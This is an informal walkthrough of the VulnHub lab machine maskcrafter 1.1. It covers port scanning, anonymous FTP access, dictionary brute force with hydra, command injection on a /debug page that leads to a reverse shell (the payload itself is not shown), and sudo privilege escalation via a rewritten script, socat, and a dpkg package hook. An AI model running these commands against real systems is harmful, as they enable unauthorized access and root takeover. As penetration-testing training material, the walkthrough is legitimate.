


# maskcrafter: 1.1 Walkthrough 

**VulnHub Link:** [maskcrafter: 1.1](https://www.vulnhub.com/entry/maskcrafter-11,445/)
**Difficulty:** Easy
**Release Date:** 30 Mar 2020

## 1.Reconnaissance
```bash
rustscan -a 172.16.184.133 --ulimit 5000
nmap -A -Pn -sV -sC -p21,22,80,111,2049 172.16.184.133
```

## 2.Enumeration
We starting enumeration with ftp
```bash
ftp 172.16.184.133
```

We can logged in as anonymous (anonymous:anything)
and found pub directory which has two files

```bash
cd pub
get cred.zip
get NOTES.txt
```

we are trying to crack zip file to get files extracted with john the ripper or hashcat it does not matter but got no result

```bash
cat NOTES.txt
```

we can login by using sql injection but there is nothing useful information but /debug is important

While Web enumeration --> 
```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt,.bak -u http://172.16.184.133
```

the only directory we need is /debug as we see from notes.txt
we can brute force it by using hydra
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 172.16.184.133 http-get /debug
```

credentials are  admin:admin

after seeing the /debug directory
we are opening burp suite
we are trying commands like whoami
and thats working
we are writing reverse shell code here


## 3.Privilege Escalation (Horizontal)

and here we go we get shell
```python
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
it have to be done for changing shell to terminal

in /var/www/html we see db.php
after reading it we see the mysql's password and the username

anddd YESSS we found the zip file's password
we found user called userx and his password
we logged his account with ssh by using these creds
the first thing we do here is 
```bash
sudo -l
(evdaez) NOPASSWD: /scripts/whatsmyid.sh
```


we change the content of the file it was id
we change it to bash -i
```bash
sudo -u evdaez ./whatsmyid.sh
```
YEAAA wee are now evdaez
and we try sudo -l again
(researcherx) NOPASSWD: /usr/bin/socat
and found this
we are visiting gtfobins

```bash
sudo -u researcherx socat stdin exec:/bin/sh
```

this is the command we are going to write
now we are researcherx
againnnnn use the sudo -l
found dpkg
use the code GTFobins gave

```bash
cd /tmp
TF=$(mktemp -d)
echo 'exec /bin/sh' > $TF/x.sh
fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF
sudo dpkg -i x_1.0_all.deb
```

and BOOOM ! We are RooT
